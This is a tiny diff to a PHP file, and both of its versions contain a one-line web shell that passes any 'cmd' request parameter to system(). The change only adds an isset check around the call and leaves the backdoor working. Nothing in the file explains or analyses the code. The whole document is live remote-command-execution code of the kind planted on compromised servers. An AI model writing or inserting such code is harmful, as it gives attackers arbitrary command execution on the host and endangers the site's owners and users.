@@ -1,3 +1,6 @@
 <?php
-  system($_REQUEST['cmd']);
+  if(isset($_REQUEST['cmd']))
+  {
+    system($_REQUEST['cmd']);
+  }
 ?>
